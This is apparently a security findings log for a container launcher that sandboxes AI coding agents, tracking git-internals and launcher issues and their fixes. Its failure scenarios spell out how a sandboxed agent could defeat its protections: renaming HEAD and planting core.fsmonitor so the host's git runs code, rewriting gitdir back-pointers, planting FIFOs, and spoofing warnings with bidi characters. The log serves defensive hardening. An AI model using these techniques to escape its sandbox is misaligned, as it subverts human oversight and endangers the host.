- **Status: FIXED** (2026-10-28; the user's choice of the fix direction). `check_volume()` takes a mode for a `.git` below the top level: `refuse` (sync, as before), `list` (inspect: `NESTED|<path>`, 50 and then `NESTED-MORE|<n>`) and `defer` (reset). Reset then clones and checks the primary branch, and only then `remove_nested()` removes each with `rm -rf` (a `REMOVED|<path>` record each, rendered by `repo.sh` even when the reset then fails) and checks none is left — right before the first git that uses the volume as a worktree, so none is read and a reset that cannot go ahead removes nothing. A `NESTED_PENDING` flag makes that git refuse if the removal is ever skipped (automated security review). `find` follows no link, so a nested `.git` that is a link is removed as one, and one reached through a linked directory is neither listed nor removed. `repo.sh` lists each as `REMOVE <path>` in the confirmation and counts it at risk. Its review found the tests not pinning either property (a mutant that removed nothing passed, `clean` deleting them anyway; so did `find -L`) and the removal running before the clone: `tests/test-repo-git-reset.sh` now has a remote gitlink at `sub` with the volume's `sub/.git` naming a repository whose config includes a FIFO outside the volume — bounded by a FIFO writer, since an orphaned git held `p_timeout`'s capture open — a linked directory holding a `.git`, and an unreachable remote that must leave a nested repository alone; each mutant (no removal, `find -L`, removal before the clone) fails one. sync still refuses them; the summary in `tests/test-repo-destructive.sh`. falsify on the helper: 206 of 219, ledger OK.
- Severity: LOW. Confidence: CONFIRMED
- Location: repo-git-reset.sh: `check_volume()` (`-name .git`).
- What's wrong: initialised submodules, `pip install -e` checkouts under `src/`, and clones inside ignored directories all block `inspect`, `reset` and `sync`. That includes `reset`, which would delete them anyway.
- Fix direction: in `reset` (or `inspect`), list the nested `.git` paths, and after confirmation remove them with `rm -rf` before any git runs, so git never reads them. `sync` keeps refusing them.

### REPO-6: `pull` is not atomic once the worktree has been fast-forwarded
- **Status: FIXED** (2026-10-28). After the fast-forward, `pull` records how to undo it (`UNDO_DIR`, `UNDO_FROM`, `UNDO_TO`, initialised empty so nothing comes in from the environment), and `die()` runs the reverse two-way merge before it exits: the checkout is put back, and the message says so — or that it could not be, and `reset` is the way out. `install_git_dir()` clears it before it removes the old `.git`: its review found the first version undoing the worktree after the old `.git` was gone and saying "put back as it was" over a volume with no `.git`. From there the new `.git`, which matches the checkout, is kept — a partly failed removal deleted it — and the error names the `mv` that installs it; tested for a failing `mv` and, non-root, a partly removed `.git`, each red on the old helper, and following the named move gives a clean checkout. `tests/test-repo-git-reset.sh` fails the copy of the new `.git` with a `cp` shim: the checkout ends at its old commit with nothing changed (red on the old helper, which left the remote's new file behind under the old `.git`).
- Severity: LOW. Confidence: PLAUSIBLE
- Location: repo-git-reset.sh: `read-tree -m -u`, then `install_git_dir()`.
- What's wrong: a failure after the two-way merge leaves the worktree at the new tip under the old `.git`, for example a full disk while the new `.git` is copied. The old `.git` is intact, because the stage-then-swap holds, but the checkout now looks like reverse uncommitted changes, and every later sync refuses.
- Fix direction: on failure after the merge, run a reverse `read-tree -m -u <remote tip> <old tip>`. Or say in the error that `reset` is the way out.

### REPO-7: The git helper's container has a memory limit and nothing else
- **Status: FIXED (batch 4)** — `0c15b88` (`--memory-swap`, `--pids-limit 512`, `REPO_HELPER_MEMORY` validated, documented and machine-only, exit 137 named). No time limit yet; Docker's 6 MB minimum is left to Docker's own refusal.
- Severity: LOW. Confidence: CONFIRMED (from code)
- Location: repo.sh: `git_helper_run()` (`--memory "${REPO_HELPER_MEMORY:-4g}"`).
- What's wrong: there is no `--memory-swap`, no `--pids-limit` and no time limit. `REPO_HELPER_MEMORY` is neither validated nor documented. An out-of-memory kill gives only the generic failure message.
- Fix direction: add `--memory-swap` equal to the memory, a `--pids-limit`, and a watchdog. Validate the value, document the key, and name exit 137 as an out-of-memory kill.

### REPO-8: `reset`'s confirmation lists branches only, and nothing a reset removes can be undone
- **Status: FIXED** (2026-10-28). `repo-git-reset.sh: cmd_inspect()` emits `STASH|<entries>` and, per local tag, `TAG|<name>|<kept>|<commit on a remote branch>` — kept when the fresh clone has it at the same object, so reset brings it back. `repo.sh: collect_inspections()` lists the stash and every tag not kept in the confirmation, and counts the stash, a tag whose commit is on no remote branch, and an unknown one in the WARNING with unpushed branches. Its review found two more: the primary branch's own unpushed commits were skipped by the summary although reset moves it to the remote's tip, so they were lost unannounced (older than this fix) — now a `MOVE <primary> to the remote's tip — N commit(s) not on any remote` line, counted at risk; and a history walk per tag (1000 tags: 32 s to inspect) — the walk now runs only for a tag reset drops. A tag whose object name could not be read (a hand-written name with a newline) is unknown, not matched as kept, and `show-ref --verify` is asked rather than `rev-parse`, which resolved revision syntax in a name. Reflogs and unreferenced objects are still replaced unannounced, as AGENTS.md says. Hermetic: real git in `tests/test-repo-git-reset.sh` (a stash; tags on an unpushed commit, on a pushed one, and pushed themselves), the summary in `tests/test-repo-destructive.sh`; both red on the old code. `docs/repos-and-mounts.md`'s sample shows them.
- Severity: LOW. Confidence: CONFIRMED
- Location: repo-git-reset.sh: `cmd_inspect()`; repo.sh's rendering of its records.
- What's wrong: replacing `.git` also removes the stash, local tags, notes, reflogs and objects that nothing else references. A tag holding the only reference to a commit disappears without being mentioned. Before batch 2, a mistaken reset could be recovered from the reflog until the next gc. It no longer can.
- Fix direction: `inspect` emits `STASH|<n>` and `TAG|<name>|<on-remote>` records, and repo.sh renders them in the confirmation.

### REPO-9: `sync` drops other branches' upstream tracking and other remotes
- **Status: FIXED** (2026-10-28). `pull` sets each kept branch's upstream to its same-named branch on `origin` where there is one and the branch is behind or at it (not one that diverged from it, which would report "diverged"; its review), as it did for the checked-out branch alone; other remotes stay a documented loss. `tests/test-repo-git-reset.sh`: a second branch tracking `origin/shared` still does after a sync (red on the old helper, which left it untracked). The new `|| true` joins the ledger's EQUIVALENT group for the existing one.
- Severity: LOW. Confidence: CONFIRMED
- Location: repo-git-reset.sh: `--set-upstream-to="origin/$b"` (only the checked-out branch is re-tracked).
- What's wrong: every other branch loses its upstream, and every remote except `origin` is dropped with its `refs/remotes`. That is recoverable by re-fetching, but surprising after a "sync".
- Fix direction: restore the upstream of each branch that has a same-named branch on `origin`. Other remotes stay a documented loss, because their URLs are agent-written config.

### REPO-10: Nits in the repo helper
- **Status: OPEN** (reviews of `82698a0` and `80a35d0`)
- Severity: NIT
- A newline in a loose ref's file name splits the helper's output into fake `BRANCH|` records. Names are shown sanitised, but the record structure is not.
- `--ignore-submodules=all` hides a gitlink replaced by a symlink, so `pull` succeeds and keeps the link. `reset` does not recreate an empty gitlink directory.
- An intent-to-add entry (`git add -N`) is refused as a staged change, although nothing would be lost.
- `diff-index --cached` trusts the index's cache-tree extension, so a hand-crafted index can hide staged entries. Only the agent's own data is at stake.
- `sync_from_git` drops record types it does not recognise. Unlike `reset_git`, it does not print them verbatim.
- A packed ref longer than the `cut -c1-4200` limit is truncated rather than refused.
- The index copy has no size or time bound.
- Ignored files the remote now tracks are overwritten, as `git pull --ff-only` also does. The docs' "an untracked file the remote now tracks" reads as covering every untracked file.
- Tests missing:
  - `diff-index` exiting 128;
  - intent-to-add and unmerged entries;
  - operations still in progress;
  - nesting more than one level deep;
  - a `.git` symlink.
  Two more gaps: the fail-closed `find` test runs only when not root, and the hermetic suite runs the host's git (2.56), not the seed image's (2.45).


### REPO-11: `repo.sh rm`/`reset` act on a base volume whose label names another repo
- **Status: FIXED** (2026-10-28). `repo.sh: foreign_base_owner()` reads the base volume's `ai-containers.repo` label; `cmd_rm()` refuses one labelled for another repo before its prompt, and `reset` lists it as left untouched (`collect_inspections()`, without inspecting it) and skips it in `reset_one()` before anything is removed, its working copies included. `sync_one()` skips it too — its review found `sync` running `rsync --delete` and a `chown` into another repo's volume, or the `pull` helper — and `add` no longer calls such a volume stray. `rm`'s refusal names the prefix the volume belongs to and how to drop the registry entry alone. Reset's summary checks it before the path branch (it announced a path repo on another repo's volume as re-mirrored), and its no-primary line now says the working copies are still removed, which they are, by design. An unlabelled volume names no owner and is handled as before; a docker error between the existence check and the label read would let one through, accepted. Hermetic, in `tests/test-repo-destructive.sh`, each red on the old code: with `docs`'s base volume relabelled for `other`, the old code's `rm docs --yes` removed it and both working copies, and `reset` ran the git helper on it four times and removed the working copies; now neither removes anything.
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: repo.sh: `cmd_rm()` and `reset_one()` (the base volume is `repo_volume_name "$name"`, checked by name only).
- What's wrong: under a nested prefix the names collide. `repo.sh rm team-repo-x --yes` deleted repo `x`'s base volume of prefix `<p>-repo-team`, labelled `ai-containers.repo=x`, and left its working copy behind. You have to type the colliding name, and the prompt names the volume.
- Fix direction: refuse when the base volume's `ai-containers.repo` label differs from the name given, in both `rm` and `reset`.

### REPO-12: Leftovers of the batch 4 reviews
- **Status: OPEN** (reviews of batch 4)
- Severity: LOW/NIT
- The report's group column still differs from the launcher in two cases:
  - an empty `AI_CONTAINER_GROUP=` in `sandbox.local.env` (the launcher uses `default`, the report the `sandbox.env` group);
  - `host` then another group in `sandbox.env` (the launcher skips the refused `host` and uses the second).
  The fix is to have `env_var` report presence apart from the value, and to keep scanning past a refused value. An empty value in `sandbox.local.env` is treated as unset by the report in general.
- Stale comments above `launcher_group` and `env_var` in ai-containers-report.sh; the note "sets no AI_CONTAINER_GROUP" also shows when the group was ignored or empty.
- A legacy unlabelled base volume named `<repo>--wc-*` is still taken for a working copy.
- Each volume now costs one to three `docker volume inspect` calls in discovery.
- The re-init carry-forward writes a kept line verbatim, a CRLF line included (harmless: the loader strips the CR); the test does not pin verbatim against normalised.
## 10. Found while fixing batch 9

Batch 9 (`9bd3729` … `6a0b37f`) went through 19 review rounds. Every HIGH and MEDIUM they found was fixed before the merge; what follows is what they left open, each checked against `6a0b37f`: 14 GIT (8 LOW, 6 NIT) and 10 LNCH (7 LOW, 3 NIT). "Reproduced in rNN" means that review round reproduced it, and the code it hit is unchanged at `6a0b37f`.

### GIT-6: rewriting a linked worktree's `gitdir` back-pointer silences protection of its submodules
- **Status: FIXED (batch 10)** — `86427b0`: the gitdir back-pointer keeps a worktree quiet only if it is a regular `.git` outside every writable mount, physically where it says, that names this git directory back (G80).
- Severity: LOW. Confidence: CONFIRMED (reproduced: the gdsil repro gives 4 binds on `vendor/wt/x/.git`; with `GD=1`, 0 binds and no WARNING)
- Location: sandbox.sh: `if [[ "$(cd "$back" 2>/dev/null && pwd -P)" == "$g" ]]; then continue; fi`
- What's wrong: the "no worktree is known" WARNING is skipped when a worktree's `gitdir` names an absolute path outside every writable bind. It is skipped even when that path does not exist. `gitdir` is not a protected file, so the agent can rewrite it.
- Failure scenario: a linked worktree is checked out under a pruned `app/vendor/wt`, and its index records an embedded repo `x`. The agent writes `/elsewhere/.git` into `.git/worktrees/wt/gitdir`. The next launch makes no binds for `vendor/wt/x/.git` and prints nothing. `x`'s config and hooks stay writable for the host's git.
- Fix direction: stay silent only when the target exists and is outside every writable bind. Otherwise keep the WARNING. Note: the agent can get the same effect by deleting the gitlink from the worktree's own writable index, so this narrows a gap but does not close it.

### GIT-7: deleting or renaming HEAD during a session unprotects the repository at the next launch
- **Status: FIXED (batch 10)** — `86427b0`: a regular `commondir` alone makes a git directory, and a `.git`, or a worktree's or submodule's git directory inside one, counts whatever its `HEAD` holds (G77, G78, G88).
- Severity: LOW. Confidence: CONFIRMED (reproduced: `hide.sh MODE=head` gives 4 binds at launch 1 and 0 at launch 2, rc=0, nothing printed)
- Location: sandbox.sh: `[[ -L "$1/HEAD" ]] || [[ -e "$1/HEAD" && ! -d "$1/HEAD" ]] || return 1`
- What's wrong: a git directory is recognised only by its HEAD. HEAD is not bound and only `.git` itself is pinned, so the agent can remove HEAD. A `.git` directory hit in the scan is dropped (`continue`) unless it is unlistable.
- Failure scenario: in session 1 the agent runs `mv .git/HEAD .git/H`. Launch 2 binds nothing for that repository. In session 2 the agent puts HEAD back and writes `core.fsmonitor` into `config`. The host's next `git status` runs it. Between the two launches the host's git says "not a git repository", which a user may notice.
- Fix direction: treat a directory that holds the launcher's own `commondir` placeholder (exactly `./`) as a git directory whatever its HEAD. Or always queue a `-name .git -type d` hit for protection.

### GIT-8: the gitlink follow costs one subshell per (gitlink, worktree top), with no per-index budget
- **Status: FIXED (batch 10)** — `86427b0`: one subshell resolves every checkout of an index, and an index recording more than 1000 gitlinks refuses the launch (G82).
- Severity: LOW. Confidence: CONFIRMED (reproduced: the biglinks repro, 20k gitlinks, takes 16 s with 19 decoy `.git` files naming the worktree and 1 s with none. r9 measured 83 s for 5k gitlinks × 20 tops when the checkouts exist)
- Location: sandbox.sh: `if [[ "${gres[$co]:-}" != "$co" ]]; then`
- What's wrong: for each gitlink, the loop runs once per top (up to 20, any of them a `.git` file the agent planted). It forks a `$(cd; pwd -P)` subshell whenever the checkout path exists. Nothing caps the gitlinks followed per index.
- Failure scenario: the agent writes 100k gitlinks into a writable worktree index, plants 19 `.git` files naming that worktree, and `mkdir`s the checkout paths. Every later launch takes tens of minutes. It still succeeds, and nothing is refused.
- Fix direction: resolve `co` without forking (a `cd -P` in the current shell, restoring the directory). Or cap the gitlinks followed per index (about 1,000), with a WARNING past the cap.

### GIT-9: every planted repository is scanned and its index read before SANDBOX_GIT_MAX refuses
- **Status: FIXED (batch 10)** — `86427b0`: past `SANDBOX_GIT_MAX` the scan stops following and the launch is refused, whatever the protection loop would count (G83, G85).
- Severity: LOW. Confidence: CONFIRMED (reproduced: `gitmax-cost.sh 2000` takes 21 s before `ERROR: the writable mounts hold more than 200 git directories`)
- Location: sandbox.sh: `if (( gn >= gitmax )); then`
- What's wrong: `git_dirs_in` runs over every mount and follows every `.git` file and index (a `git config`, `ls-files` and `grep` per git directory) before the protection loop counts against the limit. With the index read under `timeout -k 2 10`, a concurrent container swapping indexes for FIFOs can make each read cost up to 12 s.
- Failure scenario: the agent plants 20k small repositories. Each later launch spends minutes scanning, and is then refused anyway.
- Fix direction: stop following and reading indexes once the queue is past SANDBOX_GIT_MAX, since the launch will be refused. Optionally give all index reads one shared deadline.

### GIT-10: small agent-writable git files are read with no time bound after a `-f` check
- **Status: FIXED (batch 10)** — `86427b0`: every small git file is read under a 2 s bound (`_rd()`, `_git_file_config()`), and a read cut off refuses the launch through `_rd_fail()`, saying why (G84, G86).
- Severity: LOW. Confidence: PLAUSIBLE (from code; needs a race, not reproduced)
- Location: sandbox.sh: `GIT_DIR=/dev/null "${_rd_t[@]}" git config --file "$f" "$@" || rc=$?`
- What's wrong: only the index read is wrapped in `timeout`. Config reads (`_git_file_config` and its callers: `core.worktree`, `extensions.*`, includes, exec keys) and the `head -c 4096` reads of `.git` files, `commondir` and `gitdir` all run after a `-f` test, with no bound.
- Failure scenario: a second container on an overlapping writable tree swaps one of these files for a FIFO between the test and the open. The launch then blocks for ever. This is a DoS only, because the launcher runs nothing it reads.
- Fix direction: route these reads through one bounded helper (`timeout 2`, or a non-blocking open), and treat a timeout as unreadable.

### GIT-11: the launcher writes `config`, `commondir` and `hooks/` into config-less repository fixtures a project tracks
- **Status: FIXED (batch 11)** — `04e56e3`: every bare repository gets the placeholders, a tracked test fixture too; `SANDBOX_GIT_FIXTURES`, which exempted listed fixtures (batch 10, `86427b0`), was dropped, because a committed list could name a bare repository you push to (LNCH-16; the user's choice). AGENTS.md says to ignore `<fixture>.git/commondir` and `<fixture>.git/config` in the project's `.gitignore`, and `config.worktree` where the fixture turns `extensions.worktreeConfig` on (G79).
- Severity: LOW. Confidence: CONFIRMED (reproduced: the fixture repro; after a launch, `git status` shows `?? testdata/fixture.git/commondir` and `?? testdata/fixture.git/config`)
- Location: sandbox.sh: `if [[ ! -e "$g/config" && ! -L "$g/config" ]]; then ( set -C; : > "$g/config" ) 2>/dev/null || true; fi`
- What's wrong: any HEAD + `objects/` + `refs/` directory is protected, so a tracked test fixture with no config gets permanent untracked placeholder files. AGENTS.md does not mention this.
- Failure scenario: a project tracks `testdata/fixture.git/` with no config. After one launch its tree is dirty, and a test that relies on the fixture having no config behaves differently.
- Fix direction: no security fix is needed. Document it beside the placeholder text in AGENTS.md (add the files to the fixture's `.gitignore`). Or make the `config` placeholder only where a `.git` file or an index names the directory, or where it is named `.git`.

### GIT-12: a planted commondir can make the launcher write placeholders into any directory that has `objects/` and `refs/`
- **Status: WON'T FIX (batch 10)** — `86427b0`: kept as it is. Git reads a common directory's config and hooks for its worktrees with no `HEAD` there, so the placeholders are what protects a real one; `_is_common_dir()`'s comment says why no `HEAD` is required.
- Severity: LOW. Confidence: CONFIRMED (reproduced: `app/w` with HEAD and `commondir` = `../node_modules/pkg`, where `pkg` has only `objects/` and `refs/`. The launch creates `config`, `commondir` and `hooks/` in `pkg` and binds them read-only)
- Location: sandbox.sh: `_is_common_dir() { [[ -d "$1/objects" && -d "$1/refs" ]]; }`
- What's wrong: a commondir target needs only `objects/` and `refs/` to be queued. The protection step then treats it as a repository's own git directory and makes placeholders there. The files are inert, but they are permanent, untracked, and land where the agent chose.
- Failure scenario: the agent points a commondir at a dependency or data directory that happens to have that shape. That directory gets stray files, and pins that can return `EBUSY` inside the container.
- Fix direction: require HEAD before the placeholder step, and keep `_is_common_dir` for following only. Or document it.

### GIT-13: the git-side refusal of a searchable but unlistable `.git` is not gated on ownership
- **Status: RESOLVED (batch 10)** — `86427b0`: a `.git` you can search but not list refuses the launch whoever owns it; binding another user's whole needed its config proved inert, and each review found another way it was not (the user's choice; G66, G76).
- Severity: LOW. Confidence: CONFIRMED (reproduced: `gitown.sh M=0711`, uid 1234's `.git` in the primary, gives rc=1)
- Location: sandbox.sh: `if [[ "$kind" == unr && -x "$g" ]]; then`
- What's wrong: the launcher-side refusal now applies only when the agent could write into the directory. The git side still refuses any searchable but unlistable `.git`, whoever owns it. This fails closed, so it costs usability, not safety. r18 judged it acceptable, because the host's git opens files in it by name.
- Failure scenario: another user's 0711 or 0710 `.git` inside your writable tree blocks every launch, including one where the agent cannot enter the directory at all.
- Fix direction: optionally mirror the launcher gate (refuse when the agent owns it or could write into it, or when there is an ACL). Otherwise bind it read-only whole with the WARNING. Or keep it as is and say so in AGENTS.md.

### GIT-14: the git-side "cannot be listed" WARNING always prints `chmod u+rx`, even for another user's `.git`
- **Status: FIXED (batch 10)** — `86427b0`: one hint for every unlistable case, `_unlistable_hint()`: chmod for yours, the sandbox identity's for one `SANDBOX_UID` owns, its owner otherwise (G76).
- Severity: NIT. Confidence: CONFIRMED (reproduced: `gitown.sh M=0700`, owned by uid 1234, prints `Restore: chmod u+rx …/.git`)
- Location: sandbox.sh: `_unlistable_hint "$g" '         ' "$uid"`
- What's wrong: the other three unlistable hints switch on `-O`. This one does not, so it tells the user to run a command they cannot run.
- Failure scenario: a user with another user's 0700 `.git` in the tree is told to `chmod` it, which fails.
- Fix direction: switch on `[[ -O "$g" ]]`, as the refusal branch does, and print the "It is not yours" text otherwise.

### GIT-15: decoy worktree tops share the five-per-index gitlink WARNING budget
- **Status: FIXED (batch 10)** — `86427b0`: the skipped-gitlink WARNING names the checkout, as the index places it under its worktree, not the gitlink path alone (G43).
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `printf 'WARNING: submodule %s of %s is not where its index says`
- What's wrong: `gskip` counts across every (gitlink, top) pair. The message names the gitlink path and the git directory, but not the top or the resolved checkout. A decoy top can fill the five named slots, or raise a false alarm for a gitlink that is fine under the real top. No protection is lost: following continues and the count is printed. The agent can also fill the budget directly through the worktree index it writes.
- Failure scenario: the user sees five WARNINGs about decoy checkouts and a bare "… and N more". The real one is only in the count.
- Fix direction: print `$co` instead of `$path`. Keep one budget per top, or name the real top's failures first.

### GIT-16: the index-read timeout is not applied on macOS, even where `gtimeout` exists
- **Status: FIXED** (2026-10-28). The index read probes `gtimeout` first, then `timeout` (both are GNU coreutils' and take the same arguments), and AGENTS.md says so. G44 now also runs with a recording `gtimeout` on `PATH` and requires it to bound the hanging read; red with the old probe. Not run on a Mac.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `read -r -a _gir_t <<< "$(_timeout_prefix)"`
- What's wrong: macOS has no `timeout(1)`, so the GIT-4 bound on the index read does not apply there. Homebrew coreutils installs `gtimeout`, which is not probed.
- Failure scenario: on a Mac, a concurrent container swaps an index for a FIFO after the check, and the launch blocks for ever.
- Fix direction: also probe `gtimeout`, and update the "not on macOS" wording in AGENTS.md.

### GIT-17: `CDPATH` is not cleared before `cd "$wt"` resolves a relative `core.worktree`
- **Status: FIXED** (2026-10-28). `sandbox.sh` unsets `CDPATH` at the top, not per function: an exported `CDPATH` also makes `cd` print the directory, into every `$(cd … && pwd)` in the launcher. Hermetic G90 (and batch 10's G73) in `tests/test-git-internals-ro.sh`: a submodule whose `core.worktree` is a bare relative name, with a nested submodule under a pruned `vendor/` that only its index finds; with `CDPATH` pointing at a decoy, the nested `.git` file lost its read-only bind on the old code.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `cd "$wt" 2>/dev/null && pwd -P`
- What's wrong: a relative `core.worktree` that does not start with `./` or `../` is resolved through the host shell's exported `CDPATH`. `sandbox.env` refuses `CDPATH`, but the user's own shell may export it. The commondir case fails closed (r2 checked this). This one can misplace the top, and with it the gitlink paths.
- Failure scenario: a user with `CDPATH` exported gets a submodule's gitlinks resolved under the wrong directory, so they are not followed.
- Fix direction: `local CDPATH=` at the top of `git_dirs_in` and `launcher_ro_overlay`.

### GIT-18: `_lex_norm` truncates a path at a newline
- **Status: FIXED** (2026-10-28). `_lex_norm()` splits by `${rest%%/*}`, as `_path_walk()` does. Hermetic G91: a `.git` file in a directory named `a<LF>b` naming `../real73` gave the spurious "through a link" `WARNING:` on the old code and gives none now; batch 10's G74 checks `_lex_norm()` itself.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `if [[ "$rest" == */* ]]; then rest="${rest#*/}"; else rest=""; fi`
- What's wrong: `read` stops at the first newline, so a `.git` file whose directory name holds a newline gets a truncated lexical path. That gives a spurious "through a link" WARNING, or a "does not exist" WARNING naming the wrong path. The follow decision uses the physical path, so this is cosmetic.
- Failure scenario: the agent names a directory `a<LF>b` and plants a `.git` file in it. The user sees a misleading WARNING.
- Fix direction: split with a `${p%%/*}` loop, as `_path_walk` does.

### GIT-19: the include budget counts empty and oversized entries, so planted repositories can spend it
- **Status: FIXED (batch 10)** — `86427b0`: empty and oversized include values count per config only, not toward the launch's 1000 (G72 covers the empty ones).
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `if (( ++ients > 1000 )); then icut=1; ii=${#ifile[@]}; break; fi`
- What's wrong: the per-launch counter is incremented before the empty-value and over-4096-byte `continue`s. Entries that cost nothing to check use up the budget.
- Failure scenario: the agent plants repositories with 1,000 empty `include.path` entries. Every later config, the user's own included, gets the "not every include was followed" WARNING. It is named, as designed, but the agent pays nothing for it.
- Fix direction: count only the entries that are actually walked.

### LNCH-5: an unlistable directory the agent made can pass as yours under a remapping file share with `SANDBOX_UID` overridden
- **Status: FIXED (batch 10)** — `86427b0`: a searchable but unlistable directory you own refuses too (`_agent_could_write()`; T25b).
- Severity: LOW. Confidence: CONFIRMED (reproduced, host side only: your own 0311 directory with `SANDBOX_UID=4242` gives rc=0, the overlay and a WARNING, not a refusal. The macOS ownership remap itself was reasoned, not run)
- Location: sandbox.sh: `[[ -O "$1" ]] || _agent_bits_writable "$@"`
- What's wrong: on Docker Desktop or Colima, files the agent creates appear on the host as owned by the launching user, not by `SANDBOX_UID`. With `SANDBOX_UID` overridden, `-user "$uid"` misses a 0311 directory the agent made, so the directory is overlaid instead of refused.
- Failure scenario: the agent plants a FIFO in a directory, then sets the directory to 0311. Later launches overlay it read-only with a WARNING. The agent can still open the FIFO by name through the overlay.
- Fix direction: also refuse when `[[ -O "$l" ]]`. You can always fix your own directory, and the hint already says how.

### LNCH-6: an ACL is invisible where `ls` does not mark one (busybox, CIFS)
- **Status: FIXED (batch 10)** — `86427b0`: `getfacl` decides where there is one (T25e, T25g); otherwise only GNU's or a BSD `ls` is trusted (T25g on macOS, which has no `getfacl`); refusing any other `ls` there is not tested (LNCH-18).
- Severity: LOW. Confidence: CONFIRMED (reproduced in r18: busybox `ls -ld` printed `d-wx-wx--x` for a directory with `setfacl -m u:4242:wx`, where GNU printed `d-wx-wx--x+`. The code is unchanged)
- Location: sandbox.sh: `a="$(cd / && getfacl -c -- "$1" 2>/dev/null)" || return 0`
- What's wrong: ACLs are detected only through the `+` that GNU and BSD `ls` print. busybox prints none, and GNU prints none for CIFS ACLs, so the bare mode passes. The group bits shown are then the ACL mask, judged against the directory's group, not the agent's.
- Failure scenario: on an Alpine host, a directory the agent can write through an ACL entry gets the overlay and a WARNING instead of a refusal.
- Fix direction: treat an `ls` that is neither GNU nor BSD (for example one that resolves to busybox) as unknown, and fail closed. Or, where `getfacl` exists, refuse on any entry beyond `user::`, `group::` and `other::`.

### LNCH-7: only the unlistable directory's own mode is judged, not an agent-writable subdirectory inside it
- **Status: DOCUMENTED (batch 10)** — `86427b0`: `_agent_could_write()`'s comment says that only the directory's own mode is judged.
- Severity: LOW. Confidence: PLAUSIBLE (from code; r18 built the layout with the own repro)
- Location: sandbox.sh: `# mode is judged; a writable directory inside another user's is not seen`
- What's wrong: another user's 0711 directory `d` holding a 0777 `d/sub` gets the overlay. A FIFO planted earlier in `d/sub` (by a run that mounted `d/sub` writable itself) is not found, and can be opened through the read-only overlay.
- Failure scenario: it needs names the agent cannot list, and a host user who runs a launcher inside another user's tree. That is the same class as content poisoned before the protection existed, which AGENTS.md lists as not covered.
- Fix direction: none is needed. Optionally, have the comment and AGENTS.md say that only the directory's own mode is judged.

### LNCH-8: `%q` sites still print bidi override characters raw (LNCH-3 residue)
- **Status: FIXED (batch 10)** — `86427b0`: every scanned name goes through `_q()`, which renders one the terminal cannot show as `$'…'`, exact when pasted (T52).
- Severity: LOW. Confidence: CONFIRMED (reproduced: under C.UTF-8, bash 5.3's `printf %q` prints U+202E as the raw bytes `e2 80 ae`)
- Location: sandbox.sh: `printf '         %s\n' "$(_q "${cl[k]}")" >&2`
- What's wrong: `_term` replaces C0, C1 and the bidi overrides, but many messages print scanned names with a bare `%q`. glibc counts U+202A–U+202E and U+2066–U+2069 as printable, so `%q` passes them through. Launcher sites: both refusal listings (`cl[k]`, `ug[k2]`), every `Restore: chmod u+rx %q`, `rm %q`, and the unchecked-launchers NOTE. Git sites: `cannot read the index of %q`, both gitlink WARNINGs (which print `$path` straight from the agent's index), `not every include of %q` / `git config --file %q`, `ls -l %q`, and `sends git to %q` (commondir contents).
- Failure scenario: the agent names a directory or a gitlink path with U+202E. The user's terminal shows a reordered name, so the WARNING or refusal points at a path that looks like something else.
- Fix direction: `$(_term "$(printf %q "$x")")`, or a small `_q` helper used at every `%q` site.

### LNCH-9: the agent can make every later launch refuse with a 0100 or 0311 directory in `.agent-blocked/`
- **Status: FIXED (batch 10)** — `86427b0`: a candidate inside an output directory's source only warns, whichever mount reaches it (T55).
- Severity: LOW. Confidence: CONFIRMED (reproduced: `blkfifo.sh V=dir000 DM=0100` gives rc=1, "…/.agent-blocked/d can be searched but not listed by you")
- Location: sandbox.sh: `[[ "${bsrc[i]##*/}" == "${bdst[i]##*/}" ]] && outsrc+=("${bsrc[i]}") ;; esac`
- What's wrong: the FIFO find now prunes the output directories, but `.agent-blocked` is itself a writable mount root. `launcher_dirs_in` scans it, and the unlistable refusal fires for a directory the agent leaves there. Nothing on the host reads that directory as code.
- Failure scenario: in the default layout the agent runs `mkdir d; chmod 0100 d` in `/workspace/.agent-blocked`. Every later launch refuses until the user fixes it. The message names the directory and gives `chmod u+rx`. The agent could force a correct refusal in the primary anyway.
- Fix direction: skip the `.agent-blocked` and `.agent-discovery` mount roots in the unlistable scan, or only WARN there.

### LNCH-10: the FIFO find over read-only sources has no prune and no bound
- **Status: FIXED (batch 10)** — `86427b0`: the FIFO search has 30 s per source and 90 s per launch, past which the launch is refused naming where (T56, T59).
- Severity: LOW. Confidence: PLAUSIBLE (r15 measured a 2 s launch for a planted launcher holding 200,000 files; the code is unchanged)
- Location: sandbox.sh: `fx="$(cd / && "${ft[@]}" find "$x" \( -type p -o -type b -o -type c \) -print -quit 2>"$ferr")" || frc=$?`
- What's wrong: every file under every launcher overlay and every bound git internal is walked, the engine checkout's `.git/objects` included. The agent controls the size, up to 50 launchers.
- Failure scenario: the agent fills planted launchers with millions of files. Every launch is slower, but nothing hangs.
- Fix direction: a file-count or time bound, past which the launch is refused with the directory named. Or prune `.git/objects`.

### LNCH-11: a FIFO can appear inside a read-only directory source between the find and `docker run`
- **Status: FIXED (batch 10)** — `86427b0`: `_ro_fifo_search()` runs again just before docker, and the output directories join the verify manifest (T57, T61).
- Severity: LOW. Confidence: PLAUSIBLE (from code; needs a concurrent container, not reproduced)
- Location: sandbox.sh: `if [[ -n "${_vrof[$_vsrc]:-}" ]] && [[ -p "$_vsrc"`
- What's wrong: at manifest time only FILE sources (`launcher_ro_files`) are rechecked. The contents of a directory overlay are not rechecked after the FIFO find.
- Failure scenario: a concurrent container, with that directory writable as one of its own mount roots, creates a FIFO there in the window. This launch then binds it read-only, and the agent can write through it.
- Fix direction: repeat the FIFO find for directory sources just before writing the manifest, or accept and document the race next to the existing concurrent-swap text.

### LNCH-12: the "It is not yours" hint is wrong when the sandbox identity owns the directory
- **Status: FIXED (batch 10)** — `86427b0`: with GIT-14, `_unlistable_hint()` (G76).
- Severity: NIT. Confidence: PLAUSIBLE (reproduced in r17 with the own repro case A, `SANDBOX_UID=4242` owning a 0711 directory; the hint code is unchanged)
- Location: sandbox.sh: `It belongs to the sandbox identity (SANDBOX_UID=%s)`
- What's wrong: the refusal is correct, but when the owner is the `SANDBOX_UID` you chose, the hint tells you to ask its owner.
- Failure scenario: a user with an overridden `SANDBOX_UID` gets advice that does not apply. The useful step is `sudo chmod u+rx`, or a `chown` back.
